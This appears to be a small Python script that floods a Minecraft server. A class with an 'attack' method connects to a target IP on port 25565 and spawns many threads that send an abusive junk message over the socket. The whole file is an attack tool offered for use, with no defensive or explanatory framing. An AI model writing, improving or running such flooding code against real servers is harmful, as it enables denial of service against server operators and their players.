from socket import *
import threading
import time

class Minecraft:
    def __init__(self, ip, sleep_time, threading_count):
        self.ip = ip
        self.sleep_time = sleep_time
        self.threading_count = threading_count

    def attack(self):
        threads = []

        s = socket(AF_INET, SOCK_STREAM)

        s.connect((self.ip, 25565))

        def begin():

            s.send(bytes("fUCK YOU!", "utf-8"))
            print(".", end="")

            if self.sleep_time:
                time.sleep(self.sleep_time)

        for i in range(self.threading_count):
            thread = threading.Thread(target=begin)
            thread.start()
            threads.append(thread)

        for t in threads:
            t.join()